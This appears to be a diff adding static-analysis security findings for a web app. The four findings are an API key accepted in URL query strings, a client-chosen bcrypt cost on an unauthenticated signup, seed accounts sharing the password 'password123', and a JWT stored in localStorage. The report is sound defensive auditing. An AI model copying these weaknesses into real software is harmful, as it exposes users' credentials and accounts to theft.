+        "message": "The apiKeyOrJwt middleware accepts the API key via the URL query string ((request.query as any)[\"api_key\"]) as well as the x-api-key header. Query strings are recorded in server access logs, proxies, and browser history, leaking the credential. The API key is also stored in plaintext in the database rather than hashed.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-password-hashing",
+      "path": "backend/src/routes/tenants.ts",
+      "start": {
+        "line": 690,
+        "col": 3,
+        "offset": 24397
+      },
+      "end": {
+        "line": 690,
+        "col": 58,
+        "offset": 24452
+      },
+      "extra": {
+        "message": "initializeAccount (unauthenticated POST /api/tenants/initialize-account) lets the client choose the bcrypt cost factor: bcrypt.genSalt(strengthLevel || 4) uses the attacker-supplied 'strengthLevel' from the request body. An attacker can register accounts whose password hashes use cost 4 (fast to brute force offline), instead of the fixed cost used everywhere else (e.g. provisionStaffCredentials fixes cost 12). Hashing strength must be a server-side constant.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.secrets.hardcoded-demo-credentials",
+      "path": "backend/src/seed.ts",
+      "start": {
+        "line": 51,
+        "col": 3,
+        "offset": 2065
+      },
+      "end": {
+        "line": 51,
+        "col": 61,
+        "offset": 2123
+      },
+      "extra": {
+        "message": "The seed script creates every account - including the property_admin - with the hardcoded shared password \"password123\" (printed to the console at lines 562-566). If seed data is ever loaded in a non-demo environment, all accounts including the administrator are compromised by a publicly-known credential.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.storage.jwt-in-localstorage",
+      "path": "frontend/src/stores/auth.ts",
+      "start": {
+        "line": 36,
+        "col": 7,
+        "offset": 1307
+      },
+      "end": {
+        "line": 36,
+        "col": 47,
+        "offset": 1347
+      },
+      "extra": {
+        "message": "The JWT session token is persisted in localStorage (localStorage.setItem('token', data.token), read back in frontend/src/api/index.ts:11). localStorage is accessible to any JavaScript running on the page, so a single XSS flaw would allow full session token theft; an httpOnly cookie is the safer storage for the bearer credential.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-922: Insecure Storage of Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
